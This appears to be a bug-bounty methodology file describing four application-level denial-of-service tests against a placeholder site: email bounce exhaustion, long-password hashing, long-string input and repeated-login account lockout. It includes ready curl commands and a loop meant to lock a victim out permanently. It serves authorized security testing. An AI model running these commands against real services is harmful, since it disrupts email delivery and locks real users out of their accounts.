---
name: attack-application-dos
description: "Application-level DoS — email bounce exhaustion, long password hashing, long string, and permanent account lockout"
category: "business-logic"
version: "1.0"
author: "bountyreper-official"
tags:
  - dos
  - application-dos
  - business-logic
tech_stack:
  - web
cwe_ids:
  - CWE-400
  - CWE-770
chains_with:
  - wstg-busl-04
prerequisites: []
---

# Application-Level DoS

## Objective

Cause denial of service at the application logic layer without infrastructure flooding.

> **Attribution:** Methodology from [KathanP19/HowToHunt — Application_Level_DoS](https://github.com/KathanP19/HowToHunt/tree/master/Application_Level_DoS) by g0t_rOoT and fanimalikhack. Licensed GPL-3.0.

## Testing Methodology

### 1. Email Bounce Exhaustion

```bash
# Find invite functionality, send to invalid addresses
curl -X POST https://target.com/invite -d "email=invalid@invalid.invalid"
# Repeat 100+ times, monitor bounce rate via headers
# If using AWS SES/HubSpot, check hard bounce limit (2-5% triggers block)
# Impact: Email provider blocks company — no emails to any user
```

### 2. Long Password Hash DoS

```bash
# Test length restriction (should be ≤128)
long=$(python3 -c "print('A'*5000)")
time curl -X POST https://target.com/reset-password -d "password=$long" | head
# No limit + slow response / 500 = DoS via bcrypt hashing
# Focus on forgot-password and change-password (registration often limited)
```

### 3. Long String DoS

```bash
long=$(python3 -c "print('A'*1000)")
curl -X POST https://target.com/profile -d "username=$long&address=$long"
# Check: long search time or 500 error when searching for that user
```

### 4. Permanent Account Lockout

```bash
for i in {1..20}; do curl -X POST https://target.com/login -d "email=victim@target.com&password=wrong"; done
# If account blocked >30 min without captcha and old sessions expired → P2
# Re-loop with interval to permanently block victim
```

## What Constitutes a Finding

| Condition | Severity |
|-----------|----------|
| Email bounce reaches provider block threshold | High (P2) |
| Long password causes measurable DoS (hash exhaustion) | Medium (P3) |
| Permanent account lockout >30 min | Medium (P2-P3) |

## References

- [HowToHunt — ALD](https://github.com/KathanP19/HowToHunt/tree/master/Application_Level_DoS)
